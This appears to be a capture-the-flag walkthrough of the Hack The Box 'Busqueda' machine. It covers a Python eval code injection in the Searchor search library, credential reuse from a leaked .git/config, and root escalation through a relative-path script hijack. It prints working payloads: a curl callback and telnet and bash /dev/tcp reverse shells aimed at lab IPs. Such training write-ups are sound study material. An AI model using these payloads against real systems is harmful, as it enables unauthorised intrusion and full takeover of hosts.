---
title: Busqueda (HTB) / Easy
description: Write-up of Busqueda Machine (Hackthebox * Hacker's Wrath) 
date: 2023-05-01 09:00:00 -3000
categories: [writeups]
tags: [hackthebox, htb, writeup, easy, machine, linux, code-injection, path-manipulation]
author: tandera
show_image_post: true
---

> This page is still under construction! 
{: .prompt-warning }

<img src="/assets/writeups/2023-05-01-busqueda/infocard.png" width=500px alt="infocard Busqueda">

## Enumeration 

Scanning the ports of the server: 

```
# Nmap 7.93 scan initiated Sun Apr  9 17:30:28 2023 as: nmap -sS -oN nmap.txt 10.10.11.208
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The SSH is the `OpenSSH_8.9p1`. That way, our entrypoint is in the HTTP service. 

## Searcher

Acessing the web-page, we have:
<img src="/assets/writeups/2023-05-01-busqueda/website.png" width=600px alt="Busqueda initial page">

We can choose a search engine and do a query. If we pay attention, there's a program name in the footer of the page called <b>Searchor</b>. 

![Searchor version](/assets/writeups/2023-05-01-busqueda/searchor_version.png)]

Searching about this program, we find that it's a [Open Source project](https://github.com/ArjunSharda/Searchor) hosted on Github. Looking in to the versions, we see that, before the `2.4.2`, the project was vulnerable to [Code Injection](https://github.com/ArjunSharda/Searchor/pull/130/commits/29d5b1f28d29d6a282a5e860d456fab2df24a16b) because of a eval on the search functionality.


![Vulnerable eval](/assets/writeups/2023-05-01-busqueda/eval.png)

This is the code that will let us inside.

## How to inject code?

Eval is a Python function that allow to execute strings like code. But are some restrictions to use it. One of them is that the expression inside can't contain more than one line of code (even with "\n" or ";"). The other is that native functions like `import` must be called with the [built-in original sintax](https://docs.python.org/3/reference/import.html#the-import-system), like:

```python
eval("__import__('os')")
```

If you want to know more about evals, check [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1).

### Building the Payload

We have two parameters in our control: `engine` and `query`. The first refers to the search engine used, and it's a subclass of the Engine class. The last is the contents of our search. Let's use the `search` parameter:

```python
url = eval(
  f"Engine.Google.search('INJECTION_GOES_HERE', copy_url={copy}, open_web={open})"
)
```

To build the payload, we must create a valid python expression that executes any command of our will. So, firstly, let's write a code that uses curl to get a web-page:

```python
__import__('os').system('curl http://10.10.14.88:8000/')
```

Now, we have to inject this code into the eval expression. The simplest way to do it is by concatenating two strings: one empty and the other being the result (status code) of the command executed:

```python 
url = eval(
  f"Engine.Google.search('' + str(__import__('os').system('curl http://10.10.14.88:8000/'))) # ', copy_url={copy}, open_web={open})"
)
```
That way, our reverse shell will be executed on the server side:

```python
' + str(__import__('os').system('TF=$(mktemp -u);mkfifo $TF && telnet 10.10.14.88 4000 0<$TF | bash 1>$TF')))#
```

## Hello, wild server!

We login as the `svc` user. The user's flag is in the home directory. 

Starting our searching in the system, we can find some sensitive archives. The first one is `/etc/hosts`, that informs us about a _gitea_ subdomain (gitea.searcher.htb). 

![Login Page of Gitea](/assets/writeups/2023-05-01-busqueda/gitea_login.png)

The second one is on the webpage directory: `.git/config`. This file contain credentials of the cody user in gitea. 

```bash
$ cat config
...
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
```

This is the password to the `svc` user too.

## Another user?

Acessing the Gitea homepage, we find that there's a `administrator` user that contributed to the Searcher_site repository.

![Administrator user contribution](/assets/writeups/2023-05-01-busqueda/cody_gitea.png)

This will be usefull later.


## Our exit door: sudoers.

Checking the user permissions with `sudo -l`, we see that this command is available as root:

```bash
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Running it, we have:

```
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

It is possible that the `system-checkup.py` runs, under the hood, docker commands. Searching about the [docker ps](https://docs.docker.com/engine/reference/commandline/ps/), we confirm that theory. 


Checking the docker containers:

```
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                [...]   PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   [...]   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              [...]   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

There's it! The gitea service runs via docker on the machine. We can inspect it through the [docker-inspect](https://docs.docker.com/engine/reference/commandline/inspect/#get-a-subsection-in-json-format) command. Inside the container configuration, we find a database password that matches with the administrator's password too!

![Administrator password](/assets/writeups/2023-05-01-busqueda/docker_config.png)

## Bunker source code. 

Inside the gitea, we find a _scripts_ repo, with the `system-checkup.py` file.

![Scripts repo](/assets/writeups/2023-05-01-busqueda/scripts.png)

Checking the source code:

```python
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output

# [...]

if action == 'docker-inspect':
  # [...]

elif action == 'docker-ps':
  # [...]

elif action == 'full-checkup':
  try:
    arg_list = ['./full-checkup.sh']
    print(run_command(arg_list))
    print('[+] Done!')
  except:
    print('Something went wrong')
    exit(1)
```

Here's our exit from here. In the `arg_list` variable (line 25), the script searches a file with the path `./full-checkup.sh`, which is relative to where the user is in the execution time. That way, we can create our own `full-checkup.sh` file and escalate privileges to root. 

```bash
cd /tmp 
vim full-checkup.sh 
```

Inside this file, let's create a reverse shell:

```vim
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.78/4444 0>&1
```

Finally, the icing on the cake:

```shell 
(local) $ nc -lvp 4444
$ chmod +x full-checkup.sh 
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
# whoami
root
```
